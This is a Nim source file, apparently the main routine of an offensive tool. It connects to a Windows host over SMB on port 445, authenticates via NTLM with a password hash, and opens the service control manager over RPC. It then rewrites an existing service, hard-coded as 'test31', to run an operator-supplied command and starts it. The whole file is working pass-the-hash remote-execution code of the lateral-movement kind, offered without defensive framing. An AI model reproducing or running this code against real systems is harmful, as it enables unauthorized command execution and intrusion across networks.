import std/os
import system
import net
import OptionsHelper
import Structs
import Packets


when isMainModule:
    PrintBanner()
    var optionsStruct:OPTIONS
    if(not ParseArgs(paramCount(),commandLineParams(),addr optionsStruct)):
        PrintHelp() 
        quit(0)
    var serviceList:seq[ServiceInfo] = newSeq[ServiceInfo](0)
    var messageID:uint64 = 0
    var treeID:array[4,byte]
    var sessionID:array[8,byte]
    var fileID:array[16,byte]
    var scManagerHandle:array[20,byte]
    var scServiceHandle:array[20,byte]
    var callID:int = 0
    if(optionsStruct.Domain != ""):
        optionsStruct.OutputUsername = optionsStruct.Domain & "\\" & optionsStruct.Username
    else:
        optionsStruct.OutputUsername = optionsStruct.Username
    var targetBytesInWCharForm:WideCStringObj = newWideCString(optionsStruct.Target) # .len property doesn't count its double null bytes, and it doesn't
    # var test = targetBytesInWCharForm.len
    # var test2:array[4,byte]
    # copyMem(addr test2[0],addr targetBytesInWCharForm[0],6)
    var tcpSocket:net.Socket = newSocket(buffered=false)
    var smbNegotiateFlags:seq[byte] = @[byte 0x05, 0x80, 0x08, 0xa0]
    var smbSessionKeyLength:seq[byte] = @[byte 0x00, 0x00]
    try:
        tcpSocket.connect(optionsStruct.Target,Port(445),60000)
    except CatchableError:
        var e = getCurrentException()
        var msg = getCurrentExceptionMsg()
        echo "[!] Got exception ", repr(e), " with message ", msg
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Connected to ", optionsStruct.Target, ":445"
    if(not NegotiateSMB2(tcpSocket,addr messageID,addr treeID, addr sessionID)):
        echo "[!] Problem in NegotiateSMB2 request!"
        quit(0)
    if(not NTLMAuthentication(tcpSocket,addr optionsStruct,smbNegotiateFlags,smbSessionKeyLength,addr messageID,addr treeID, addr sessionID)):
        echo "[!] Problem in NTLM Authentication requests!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] NTLM Authentication with Hash is succesfull!"
    if(not TreeConnectRequest(tcpSocket,addr optionsStruct, addr messageID, addr treeID, addr sessionID)):
        echo "[!] Problem in Tree Connect Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Connected to IPC Share of target!"
    if(not CreateRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID)):
        echo "[!] Problem in CreateFile Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Opened a handle for svcctl pipe!"
    if(not RPCBindRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID)):
        echo "[!] Problem in RPC Bind Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Binded to the RPC Interface!"
    if(not ReadRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID)):
        echo "[!] Problem in RPC Bind Acknowledge!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] RPC Binding is acknowledged!"
    if(not OpenSCManagerWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, targetBytesInWCharForm)):
        echo "[!] Problem in OpenSCManagerW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] SCManager handle is obtained!"
    if(not EnumServicesStatusWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList)):
        echo "[!] Problem in EnumServicesStatusW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] List of services is obtained!"
    var tempServicePtr:ptr ServiceInfo = nil
    for i in countup(0,serviceList.len-1):
        if(serviceList[i].ServiceName == "test31"):
            tempServicePtr = addr serviceList[i]
            break
    if(tempServicePtr == nil):
        quit(0)
    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,tempServicePtr[].ServiceName,addr scServiceHandle)):
        echo "[!] Problem in OpenServiceW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service is opened!"
    if(not QueryServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, tempServicePtr)):
        echo "[!] Problem in QueryServiceConfigW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service config is obtained!"
    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, optionsStruct.Command)):
        echo "[!] Problem in ChangeServiceConfigW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service config is changed!"
    if(not StartServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle)):
        echo "[!] Problem in StartServiceW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service start request is sent!"
    if(not CloseServiceHandleRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle)):
        echo "[!] Problem in CloseServiceHandle RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service handle is closed!"
    if(not CloseServiceHandleRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle)):
        echo "[!] Problem in CloseServiceHandle RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service Manager handle is closed!"
    if(not SMB2Close(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID)):
        echo "[!] Problem in SMB2 Close Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] SMB is closed!"    
    if(not TreeDisconnectRequest(tcpSocket, addr messageID, addr treeID, addr sessionID)):
        echo "[!] Problem in Tree Disconnect Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Tree is disconnected!"  
    if(not SessionLogoffRequest(tcpSocket, addr messageID, addr treeID, addr sessionID)):
        echo "[!] Problem in Session Logoff Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Session logoff!"  